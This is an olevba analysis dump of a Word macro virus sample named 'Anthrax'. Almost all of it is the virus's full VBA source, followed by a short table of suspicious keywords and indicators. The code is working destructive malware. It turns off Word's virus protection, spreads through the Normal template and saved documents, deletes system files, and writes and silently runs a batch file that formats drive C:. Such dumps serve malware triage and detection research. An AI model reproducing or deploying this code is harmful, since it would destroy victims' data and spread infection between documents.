olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zmk.h-960ddd2857a0a8f2824b8889a00e4ba95ddd370a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zmk.h-960ddd2857a0a8f2824b8889a00e4ba95ddd370a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Anthrax.bas 
in file: Virus.MSWord.Zmk.h-960ddd2857a0a8f2824b8889a00e4ba95ddd370a - OLE stream: 'Macros/VBA/Anthrax'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileNew()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFN
    Call Anthrax
ErrorFN:
End Sub
Sub AutoNew()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAN
    Call Anthrax
ErrorAN:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "Anthrax" Then
        AnthraxInstalled = -1
    End If
Next i
If Not AnthraxInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Anthrax", Object:=wdOrganizerObjectProjectItems
    MsgBox "Modèle Normal infecté!!!!", vbCritical, "Virus Anthrax"
End If
ErrorAO:
End Sub
Private Sub Anthrax()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAx
MsgBox "Anthrax est en train de contaminer votre ordinateur!!!!", vbCritical, "Virus Anthrax"
ActiveDocument.Shapes.AddLine(0#, 0#, 597.6, 0#).Select
For i = 1 To 1000
ActiveDocument.Shapes.AddLine(0#, 0#, 597.6, 0#).Select
ActiveDocument.Shapes.AddLine(0#, i, 597.6, i).Select
Selection.ShapeRange.Line.Weight = 6#
Selection.ShapeRange.Line.Visible = msoTrue
Selection.ShapeRange.Line.Style = msoLineSingle
Next i
Dim Nbre, MyDate
MyDate = Date
D$ = Mid(MyDate, 1, 2)
Randomize
Nbre = Int(Rnd * 20) + 1
If Nbre = 1 Or Nbre = 3 Or Nbre = 5 Or Nbre = 7 Then
    Kill "C:\Autoexec.bat"
    Kill "C:\Config.sys"
    Kill "C:\Windows\System\*.dll"
End If
If Nbre = 2 Or Nbre = 4 Or Nbre = 6 Or Nbre = 8 Then
Message:
    StatusBar = "HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                               HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                                       HAHAHAHAHA!!!!, Je m'appelle Anthrax et je vais détruire ton ordinateur!!!!"
    For i = 1 To 400000
    Next i
GoTo Message
End If
If (Nbre = 10 Or Nbre = 12 Or Nbre = 14 Or Nbre = 16) And D$ = "15" Then
    Open "C:\Anthrax.bat" For Output As #1
        Print #1, "Cls"
        Print #1, "Echo off"
        Print #1, "Echo Le virus Anthrax va détruire votre disque dur!!!"
        Print #1, "Echo y|Format c: /u /Autotest /v:Anthrax"
        Print #1, "Echo o|Format c: /u /Autotest /v:Anthrax"
    Close #1
    Shell "C:\Anthrax.bat", vbHide
End If
If Nbre = 13 Or Nbre = 15 Or Nbre = 17 Then
    CommandBars("File").Enabled = False
    CommandBars("Edit").Enabled = False
    CommandBars("Tools").Enabled = False
    CommandBars("File").Name = "Anthrax"
    CommandBars("Edit").Name = "Anthrax"
    CommandBars("File").Name = "Anthrax"
    MsgBox "Je suis le Virus Anthrax..." & Chr$(13) & "HAHAHAHAHA!!!!!", vbCritical, "Virus Anthrax"
End If
ErrorAx:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
        If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Anthrax", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "Le virus ANTHRAX ne peut pas vous autoriser l'accès!!!" & Chr$(13) & "HAHAHAHAHA!!!!", vbCritical, "Virus Anthrax"
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    Assistant.Visible = True
    With Assistant.NewBalloon
        .Button = msoButtonSetOK
        .Heading = "Virus Anthrax"
        .Text = "Attention, ce menu n'est pas autorisé..."
        .Show
    End With
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    ActiveWindow.Caption = "Virus Anthrax par ZeMacroKiller98"
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Anthrax.bat         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

